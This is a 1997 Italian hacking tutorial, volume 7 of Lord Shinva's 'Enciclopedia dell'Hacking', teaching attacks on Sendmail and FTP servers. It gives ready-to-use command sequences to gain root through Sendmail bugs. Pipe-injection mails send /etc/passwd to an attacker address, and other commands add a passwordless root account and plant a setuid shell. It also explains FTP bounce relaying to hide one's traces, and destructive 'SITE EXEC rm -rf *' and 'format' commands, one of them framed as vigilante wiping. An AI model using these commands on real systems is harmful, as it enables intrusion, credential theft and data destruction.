@@ -1,0 +1,471 @@
+      <=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=>
+      <=-=>                                                       <=-=>
+      <=-=>                  -=> Lord Shinva <=-                  <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>                  -DiGiTAL::ALLiANCE-                  <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>   C : 0 . N : F . E : D . E : R . A : T . i : 0 . N   <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>                                                       <=-=>
+      <=-=>              Enciclopedia dell' Hacking               <=-=>
+      <=-=>              ``````````````````````````               <=-=>
+      <=-=>                   .:[ Volume 7 ]:.                    <=-=>
+      <=-=>                                                       <=-=>
+      <=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=><=-=>
+
+TECNICHE AVANZATE: SENDMAIL
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Sarete felici di sapere che questo e` l'ultimo volume sulle tecniche
+fondamentali e gli exploit.  Dal prossimo inizieremo con l'hacking vero e
+proprio, e metteremo in pratica (con grande dolore da parte dei SysAdmin)
+quello che faremo di volta in volta.  Ovviamente mi aspettero` che ora che
+avete abbastanza informazioni di base abbiate chiari concetti come server e
+client, FakeMail, come fare piccole cose come trovare la versione di un
+server, ecc.  Se qualcosa non dovesse essere chiaro, non esitate a scrivermi
+e ad esporre il problema.  Cerchero` di rispondervi non appena avro` trovato
+abbatanza tempo.  NON chiedetemi qual'e` la password di un sito xxx o dove
+trovare la versione pirata di un gioco.  Siamo hackers, non pirati.
+
+Qualcuno mi ha chiesto perche` sto scrivendo questa "enciclopedia".
+Beh, forse perche` e` quello che ho sempre cercato e non ho mai trovato
+quando volevo imparare l'hacking... e poi credo che sia molto piu` completa
+di quei piccoli files sulle basi dell'hacking scritti da hackers, per
+hackers.  Ma quale sarebbe lo scopo?  Se uno e` gia` hacker, non ha bisogno
+di imparare le basi di quello che conosce gia`... okay, parentesi chiusa.
+
+Quello che partira` dal prossimo volume sara` pertanto un vero e proprio
+corso di hacking a puntate (con tanto di supporto via email), dedicato a
+tutti coloro che mi hanno scritto e hanno creduto in questo progetto di
+divulgazione, siano essi hackers o wannabe (futuri hackers, speriamo).
+
+Iniziamo dunque questo ultimo volume sulle tecniche con una breve descrizione
+del servizio di posta elettronica di Unix.
+
+Il programma server che risponde a chi si collega alla porta SMTP (25) e`
+chiamato Sendmail.  Come abbiamo visto in un precedente volume, all'atto del
+collegamento via Telnet avremo una risposta di questo genere:
+
+220 server.com Sendmail 8.6/8.7 12/31/97 ready at Sun, 23 Oct 97 19:44:03 PDT
+
+(il numero di versione di un server lo troviamo anche sbirciando tra gli
+headers delle emails che riceviamo quotidianamente).
+
+I numeri 8.6/8.7 dopo la parola "Sendmail" (oppure "Smail") rappresentano la
+versione del server SMTP.  Mettiamo una volta per tutte in chiaro che SMTP e`
+il nome del servizio (della porta 25) e Sendmail e` il nome del programma che
+si occupa di gestire SMTP: in pratica Sendmail e` il server SMTP di Unix.
+
+Dunque, perche` dovremmo voler conoscere il numero di versione di Sendmail?
+
+Sendmail e` famoso tra gli hackers come il programma piu` "bacato" esistente.
+Basti pensare che praticamente tutte le versioni di Sendmail in giro (anche
+quelle piu` nuove) hanno un qualche bug che un hacker puo` sfruttare per
+guadagnare illecitamente accesso a un sistema.
+
+E il bello e` il modo in cui lo si fa; non tramite una password o chissa`
+cosa, ma dalla parte piu` "innocua" di un sistema informatico: la posta
+elettronica!
+
+Vogliamo vedere cosa si puo` fare con Sendmail? :)
+
+Iniziamo con le sottoversioni della 8.6 (piu` precisamente le 8.6.6 e 8.6.7).
+Vogliamo una shell root?  Niente di piu` facile: bastera` chiamare il
+programma Sendmail con il parametro -d seguito da un numero molto grande,
+come nel seguente esempio:
+
+   Sendmail -d3344556677
+
+Se non avete un accesso diretto al server (e quindi state "lavorando" da
+remoto) avrete bisogno di una shell per "chiamare" Sendmail.
+Come ottenerla sara` oggetto dei prossimi volumi, ma se andate di fretta
+potete sempre prendere un file passwd o shadow e crackarlo per avere accesso
+shell.  L'ideale sarebbe un account di quale Universita`...
+Oppure potreste usare l'hack del PHF (o della Query, come ultima risorsa) per
+eseguire il comando senza bisogno di shell interattiva.
+Ancora una volta vi consiglio di aspettare di conoscere TUTTA la materia,
+prima di mettere in pratica... ancora non sapete come nascondervi in un
+sistema, quindi non abbiate fretta.  Se proprio volete testare qualcosa,
+procuratevi Linux (se non l'avete gia`), installatelo sul VOSTRO computer e
+provate.
+
+Per la cronaca, la sottoversione 8.6.9 non e` vulnerabile a quest'attacco, ma
+anche qui si puo` avere una shell root, utilizzando un exploit che si trova
+sui siti per hackers.  Si tratta di un programmino in C (creato da Atreus).
+Non lo includo perche` dalla versione 8.6.12 (compresa) in poi tale exploit
+non funziona.
+
+NOTA: la maggior parte dei problemi di sicurezza vengono fatti notare e molto
+spesso anche risolti proprio dagli hackers.  Se non ci fossero gli hackers
+saremmo rimasti a versioni... preistoriche, dove bastava scrivere WIZ per
+avere tutto un computer ai propri comandi.  Un motivo in piu` per smettere di
+prendersela con noi se si assume personale incapace di gestire seriamente un
+sistema informatico, sia esso in rete o meno.
+
+Ci sono molte altre versioni 8.x.x bacate, ma poiche` si tratta di piccoli
+bug tutti diversi e` consigliabile cercare quello che interessa sul sito
+di 8lgm (http://www.8lgm.org), che elenca tutti i bug e ne da` un hack
+completo per ciascuno, o su L0pht (http://www.l0pht.com).
+
+Unix assegna un livello utente (UID, cioe` User IDentifier) e un livello di
+gruppo (GID, cioe` Group IDentifier) a ciascun utente.
+Un UID pari a 0 e` (quasi sempre) un utente root.
+Se ad esempio nel file passwd di un sito troviamo...
+
+   root:7u89vCSK0oL:amministratore:0:0:/:/bin/sh
+
+il primo numero (0) e` UID e il secondo (0) e` GID.
+
+E` possibile sfruttare un bug di Sendmail per forzare il nostro UID a 0... e
+diventare root :)  Supponiamo infatti di aver crackato la password di un
+utente qualsiasi, ma di non riuscire ad accedere a root... come fare?
+Utilizzando questo hack sul Sendmail.  Bisognera` innanzitutto avere accesso
+a una shell; molti utenti hanno una shell, anche se limitata, ma servira`
+allo scopo.  Se proprio non riuscite a procurarvene una, collegatevi a una
+delle tantissime BBS via Telnet presenti su Internet.  Esse sono quasi sempre
+ad accesso gratuito e usano sistemi Unix, con tanto di shell per gli utenti.
+Non sono shell root... ma sapremo accontentarci, dal momento che da una
+shell ad accesso limitato si puo` arrivare a root.
+Alcuni siti, come quello di Lord Somer (http://www.ilf.net/LordSomer/), hanno
+intere liste di BBS Telnet.  Dovete solo scegliere quella che preferite.
+
+Dicevamo, come forzare UID a 0 ora che abbiamo una shell?
+Digitando quanto segue:
+
+% cat ~/.forward                                     <-- noi
+                                                     <-- noi
+miosito.com miousername                              <-- noi
+^D                                                   <-- noi (premere Ctrl-D)
+% smail -bs -D ~root/.rhosts -v20                    <-- noi
+220 provider.com Sendmail x.x.x.x ready ecc...       <-- server
+expn root                                            <-- noi
+250                                            <-- server
+quit                                                 <-- noi
+% rsh -l root lamesite.com tcsh\ -i                  <-- noi
+WARNING: no access to TTY (bad file number)          <-- server
+# id                                                 <-- noi
+UID=0 GID=0                                          <-- server
+
+Nell'ultima riga, quando scriviamo il comando ID, il server risponde che il
+nostro UID e il nostro GID sono uguali a 0... il che significa... beh, lo
+avete capito =)
+
+I vecchi server Sendmail (versioni 5.xx) hanno dei bug estremamente gravi;
+basti pensare alla versione 5.64 che permette di sfruttare il programma
+"decode" (uudecode) di Unix per "eliminare" l'accesso tramite password.
+In pratica, inviando una FakeMail (con Telnet) di questo tipo:
+
+HELO hacker.com
+MAIL FROM: bin
+RCPT TO: decode
+DATA
+begin 644 /usr/bin/.rhosts
+$*R`K"@``
+`
+end
+.
+QUIT
+
+sara` poi possibile utilizzare un client rlogin per collegarsi senza bisogno
+di password.  Ma come e` stato possibile?  Quello che e` successo e` questo:
+il file .rhosts di Unix contiene una lista di hostname e username ai quali
+e` consentito l'accesso.  Mettendo un + al posto di hostname e username si
+consente l'accesso a chiunque, ed e` esattamente questo cio` che abbiamo
+fatto: la linea dopo "begin 644..." non e` altro che tale comando (+ +)
+codificato con il programma encode (uuencode).  Inviando questa FakeMail a
+decode (uudecode) quel codice verra` ritrasformato in "+ +" e scritto nel
+file /usr/bin/.rhosts (vedi sopra).
+Bastera` dunque procurarsi un client rlogin per accedere tranquillamente al
+server...
+
+La versione 5.65 di Sendmail (la successiva a quella appena vista, creata
+per risolvere quel problema) e` ancora piu` pericolosa... ;)
+Infatti basta inviare via Telnet i seguenti comandi:
+
+HELO hackers.com
+MAIL FROM: |/usr/ucb/tail|/usr/bin/sh
+RCPT TO: prova
+DATA
+From: pirata@hackers.com
+Return-Receipt-To: |nessuno
+
+#!/bin/sh
+COMANDI
+.
+QUIT
+
+Al posto di "COMANDI" vanno inseriti uno o piu` comandi shell (su righe
+separate), come ad esempio:
+
+   /bin/mail pirata@hackers.com < /etc/passwd
+
+per inviare a voi stessi il file /etc/passwd (o qualsiasi altro), oppure:
+
+   echo prova::0:0::/:/bin/sh >> /etc/passwd
+
+per aggiungere l'account "prova" (con accesso root, senza password, con shell
+root e accesso a tutto l'hard disk....) al file /etc/passwd (notate i due >>
+anziche` uno solo).  O ancora:
+
+   chmod 777 /etc/passwd
+
+per rendere il file /etc/passwd (o altro) prelevabile senza restrizioni, o:
+
+   cp /bin/sh /tmp/pirata
+   chmod 6777 /tmp/pirata
+
+dove nella prima riga copiamo (cp) la shell (/bin/sh) nella directory /tmp
+col nome di "pirata" (vi consiglio di cambiare questo nome :)
+Nella seconda riga diamo accesso al file /tmp/pirata a chiunque, anche a un
+utente qualunque.  Tale file non e` altro, come abbiamo visto, che la shell.
+Quindi bastera` andare in /tmp ogniqualvolta vi servira` una shell root, e
+digitare "pirata" per invocare la shell ed eseguire un qualsiasi comando.
+
+Un altro hack famoso e` quello dell'attacco del pipe, funzionante su versione
+5.56 (e altre).  Funziona cosi`: si prepara una semplice FakeMail del tipo...
+
+HELO hacker.com
+MAIL FROM:<"|/bin/mail pirata@hackers.com < /etc/passwd">
+RCPT TO:<"pirata@hotmail.com">
+DATA
+questa e` una prova...
+.
+QUIT
+
+e, se il server e` vulnerabile, riceveremo il file /etc/passwd via e-mail.
+Naturalmente si potra` usare qualsiasi comando dopo il pipe (il "|").
+
+TECNICHE AVANZATE: FTP BOUNCE
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Passiamo ora a qualcosa di veramente interessante: FTP.  Vi chiederete: ma
+FTP non serve solo a trasferire i file?
+La risposta e` no.  Beh, dovrebbe essere si... ma sapete com'e`... un hacker
+e` un po` come un bambino curioso che si diverte di piu` a "smontare" un
+giocattolo che a usarlo per quello a cui servirebbe =)
+
+Innanzitutto sappiate che FTP altro non e` che una sessione di Telnet con
+qualche piccolo extra in piu` (il trasferimento di file).
+
+Esistono infatti dei comandi "interni", come abbiamo visto per SMTP, e quindi
+anche FTP e` gestibile (in parte) tramite Telnet.
+
+La tecnica che ci accingiamo a studiare e` detta "FTP Bounce" (rimbalzo
+dell'FTP).
+
+Vi servira` innanzitutto un server FTP che vi permetta di inviare e prelevare
+files da una directory qualsiasi.  Potete tranquillamente trovare tali server
+cercando la parola "warez" (software commerciale piratato) con un motore di
+ricerca di files come "FTP Search" (http://ftpsearch.ntnu.no/ftpsearch),
+oppure "Filez" (http://www.filez.com); prendete nota anche della directory
+che verra` visualizzata accanto al nome del server che la contiene.
+
+Ora provate a collegarvi a uno di quei server, ed a entrare nella directory
+"warez" (o un'altra in cui si possano leggere e scrivere i files).  Provate
+a inviare un file di prova e a prelevarlo di nuovo, per controllare se e`
+questo il server "giusto".  Se tutto funziona, lo avete trovato, altrimenti
+usatene un altro (ce ne sono moltissimi).
+
+Questo server sara` la vostra "base".  In tutti gli attacchi che effettuerete
+verra` visualizzato l'IP Address di questo server, anziche` il vostro.
+
+Ora studiamo il funzionamento dell'attacco, in modo da poterlo adattare a
+qualsiasi nostro bisogno, per poter magari anche inventare nuovi metodi di
+utilizzo a seconda delle necessita`.
+
+Dovremo innanzitutto creare un file (vedremo tra poco come) che contenga i
+comandi che vogliamo far eseguire (in base a cio` che vogliamo fare).
+Non preoccupatevi ora del suo contenuto.  Per ora ci interessa solo studiare
+il funzionamento della tecnica, e poi procedere con gli esempi.
+
+Ora ci servira` un normale programma client FTP (come Cute-FTP e WS-FTP se
+usate Windows, oppure il comando FTP di Linux).  Lo useremo per inviare il
+file di cui sopra nel server "base" che abbiamo scelto prima.
+
+Una volta inviato il nostro file, chiuderemo FTP e passeremo a Telnet.
+La porta di FTP e` la numero 21.  Colleghiamoci dunque al server "base" alla
+porta 21 e aspettiamo una risposta.  Ora potremo inserire i comandi:
+
+   USER anonymous
+   PASS nessuno@niente.com
+
+e, se l'accesso anonimo e` abilitato (come succede nel 90% dei casi), il
+server rispondera` qualcosa come "User anonymous logged in".  Siamo dentro.
+
+Dobbiamo ora conoscere l'IP Address del server da attaccare.  Percio` avremo
+bisogno di un programma DNS per risalire dall'host name all'IP Address.
+
+Ora digitiamo (in Telnet) il comando PORT x,x,x,x,0,y dove x,x,x,x e`
+l'IP Address del server da attaccare e y e` la porta del servizio da
+attaccare (21 per FTP, 80 per il Web, e cosi` via).
+Notate che l'IP Address in questo caso non usa punti per separare i numeri
+ma delle virgole.
+
+Quello che succede inserendo il comando PORT e` questo: diciamo al server
+FTP di collegarsi all'IP Address e alla porta che gli diamo come parametri.
+In pratica, sara` il server FTP a collegarsi, anziche` noi... abbiamo cosi`
+il server come "complice", in quanto sara` lui a fare tutte le operazioni e
+le eventuali tracce lasciate saranno le sue! :)  Noi siamo nell'ombra...
+(vi renderete conto che questo e` un ottimo mezzo per nascondere in un modo
+impensabile le proprie tracce, qualsiasi cosa vi serva fare).
+
+Bastera` ora digitare RETR nomedelfileinviato e tutti i comandi desiderati
+saranno inviati dalla "base" alla "vittima".
+
+Ma ora basta teoria, passiamo a qualche esempio esplicativo.
+
+Vogliamo ad esempio inviare una FakeMail impossibile da rintracciare?
+Allora studiamo il problema in questi termini:
+
+1) quali tipi di comandi dovremo inserire nel file?
+2) quale servizio stiamo hackerando?
+3) quale server useremo come destinazione?
+
+Ecco le risposte:
+
+1) i comandi saranno per SMTP, dovendo noi inviare una FakeMail
+2) il servizio e`, come abbiamo appena detto, la posta, cioe` SMTP
+3) un qualsiasi server SMTP andra` bene; usaremo DNS per conoscerne l'IP
+   Address (che in questo esempio supponiamo essere 123.45.67.89)
+
+Ora ci colleghiamo, come abbiamo fatto prima, al server "base" (FTP) con
+il client FTP e inviamo i comandi (che avremo scritto prima di iniziare il
+collegamento) della FakeMail: HELO, MAIL FROM, ecc. (la solita FakeMail).
+
+Adesso useremo Telnet sul server "base" (la porta e` sempre 21, fin qui
+rimane sempre tutto uguale) e digitiamo PORT 123,45,67,89,0,25 dove
+123,45,67,89 e` l'IP Address del server che dovra` eseguire il nostro file
+(il server di posta), ma con le virgole anziche` i punti (questo e` il
+formato richiesto da FTP), mentre 25 e` la porta SMTP.
+
+Infine scriveremo RETR nomedelfileinviato per avviare l'esecuzione dei
+comandi.  Dopo poco tempo la FakeMail verra` inviata dal server, ma senza
+un IP Address che riveli la nostra identita`.
+
+NOTA IMPORTANTE: alla fine del file dei comandi bisogna aggiungere circa 60
+kilobyte di byte 0, affinche` la connessione duri abbastanza e non si
+interrompa bruscamente.  Per creare tale file basta usare "debug" (sotto DOS)
+scrivendo:
+
+   DEBUG PROVA                                       <-- noi
+   File non trovato
+   -f 100,F000,0                                     <-- noi
+   -rcx                                              <-- noi
+   :0000
+   EA60                                              <-- noi
+   -w                                                <-- noi
+   Scrittura di EA60 bytes in corso...
+   -q                                                <-- noi
+
+Ora un file chiamato "PROVA" di dimensioni 60000 byte sara` stato creato.
+Se il nostro file dei comandi l'abbiamo chiamato "comandi" (che fantasia...)
+scriveremo:
+
+   copy /b comandi+prova finale
+
+E un nuovo file, "finale", verra` creato.  Questo sara` il file da inviare.
+
+ATTENZIONE: questo va fatto TUTTE le volte che useremo il metodo dell' FTP
+Bounce, non solo nel caso della FakeMail.
+
+Facciamo ora un altro esempio, un po` piu` complesso.
+
+A volte capita di trovare un server che non ci permette di prelevare un file
+perche` magari il provider da cui chiamiamo e` in Italia e il suddetto server
+invece si trova all'estero e non vuole dare accesso a chi proviene da *.it e
+cose del genere.  Come fare, allora?
+
+Creeremo un file dei comandi contenente quanto segue:
+
+        user anonymous
+        pass nessuno@niente.com
+        cwd /directory/dove/si/trova/il/file
+        type i
+        port X,X,X,X,Y,Y
+        retr nome_del_file_da_prelevare
+        quit
+
+(ovviamente anche questo file va "trattato" con debug e copy).
+
+Chiamiamo questo file con un nome come "bounce".
+
+Nel file sopra dovrete sostituire directory e nome file.  X,X,X,X e` il
+*vostro* IP Address, e Y,Y e` spiegato piu` giu`.
+
+Ecco cosa bisogna fare:
+
+- Collegatevi con Telnet alla porta 21 del server "base"
+- Scrivete PASV (e invio, ovviamente)
+- Il server rispondera` con qualcosa come 111.22.33.44,0,21
+  Prendete nota degli ultimi due numeri (0 e 21)
+- Scrivete STOR hahaha
+- Ora Telnet si blocchera`, poiche` sta aspettando i dati da inviare
+- Usate il vostro client FTP, collegatevi di nuovo al server e inviate il
+  file (nel nostro esempio l'abbiamo chiamato bounce)
+- Ora aprite un altro client Telnet, collegatevi di nuovo al server "base"
+  sulla porta 21 e scrivete PORT x,x,x,x,0,21 (dove x.x.x.x e` l'IP Address
+  del server da attaccare, cioe` quello da cui volete prelevare i file)
+- Scrivete RETR bounce (se avete chiamato "bounce" il file dei comandi)
+- Dopo un certo tempo (che dipende dalle dimensioni del file da scaricare)
+  troverete il file desiderato nel server "base", con il nome "hahaha".
+
+Esistono molti altri metodi per utilizzare l'FTP Bounce; ad esempio se volete
+"bombardare" un utente su IRC, potete creare un file dei comandi contenente
+una serie di DCC CHAT, PRIVMSG, ecc. (solo se conoscete bene IRC) e farli
+mandare dal vostro server "base" a uno (o molti) server IRC.
+
+Potete inoltre usarlo per collegarvi a una shell (i comandi Telnet vanno
+messi nel file dei comandi) e leggere il file delle password e fare altre
+cose senza essere scoperti.  Ad esempio potete usare "cat < /etc/shadow" per
+visualizzare un file delle password shadow, o un "rm -rf *" (molto utile per
+rendere la vita miserabile ai SysAdmin che si stancano di fare un backup
+di tutti i files dei loro sistemi)...
+
+Vale la pena di spendere ancora un paio di parole sui bugs di FTP.
+
+SITE EXEC e` un comando che si trova in molti server, sia per Unix che per
+Windows.  Non e` un bug, ma un comando che sembra essere stato fatto apposta
+per un hacker.malicious :)  A cosa serve, vi chiederete...
+
+Utilizzando Telnet sulla porta 21 di un server FTP, inviate i comandi USER
+e PASS come visto sopra, in modo da accedere in modo "anonimo" al server, e
+poi digitate SITE EXEC seguito da un comando.  Se SITE EXEC e` implementato,
+il vostro comando verra` eseguito.
+
+Un modo per conoscere quali comandi sono implementati su un server FTP si
+puo` usare il comando HELP.
+
+Un'attivita` che personalmente *adoro* praticare e` andare sui canali IRC per
+pedofili, aspettare che qualcuno faccia pubblicita` all'indirizzo del proprio
+server FTP pieno di schifezze e fare un po` di pulizia usando il comando:
+
+   SITE EXEC rm -rf *
+
+...se il server e` per Unix (come ftpd).  Oppure usando format /autotest se
+il server e` (praticamente sempre) per Windows (Serv-U, WarFTP).
+
+CONCLUSIONE PRIMA SEZIONE
+~~~~~~~~~~~~~~~~~~~~~~~~~
+Se non avete compreso il funzionamento di una o piu` tecniche (sperando che
+non siano troppe) non dovete preoccuparvi: col tempo le capirete, e molto
+probabilmente ne apporterete anche vostre personali varianti.
+
+Comunque, dovrete essere voi a decidere quale utilizzare, in quale occasione
+e se preferire una all'altra.  Potreste preferire una tecnica (ad esempio il
+Bounce) a un exploit (SITE EXEC) o a un hack (Sendmail o PHF).
+Sta a voi scegliere.
+
+Attenti a non cacciarvi nei guai.  Se vi serve aiuto, potete rintracciarmi
+all'indirizzo Lord.Shinva@usa.net
+
+Al prossimo volume!
+
++- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +-
+
+                           Copyright (C) 1997 by
+
+                             :: LoRD SHiNVA ::
+
+                      -Digital Alliance Confederation-
+
+                http://members.tripod.com/~helghast/dac.htm
+
++- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +- +-
